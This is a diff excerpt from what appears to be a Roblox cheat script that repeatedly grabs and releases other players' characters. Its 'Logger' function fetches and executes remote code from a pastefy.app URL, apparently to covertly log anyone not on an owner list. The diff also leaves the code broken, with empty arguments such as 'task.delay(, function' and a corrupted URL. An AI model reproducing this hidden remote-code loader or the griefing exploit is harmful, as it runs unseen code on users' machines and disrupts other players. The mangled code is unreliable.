@@ -2051,12 +2051,12 @@ end
                     local currentSeat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
                     if currentSeat and currentSeat.Parent and currentSeat.Parent.Name == "CreatureBlobman" then
                         BlobGrab(currentBlobS, charHRP, "Right")
-                        task.wait(0.03)
+                        task.wait()
                         BlobRelease(currentBlobS, charHRP, "Right")
                         charHUM.Sit = true
-                        task.delay(0.02, function() if charHUM then charHUM.Sit = false end end)
+                        task.delay(, function() if charHUM then charHUM.Sit = false end end)
                     end
-                    task.wait(0.01)
+                    task.wait()
                 end
 
                 if independentHoldConnections[player] then 
@@ -6313,7 +6313,7 @@ function Logger()
 
     if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
         local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/hCEj3bd8/raw"))() -- logger
+            loadstring(game:HttpGet("https://pastefy.app/hCEj3ㅇbd8/raw"))() -- logger
         end)
 
         if not success then
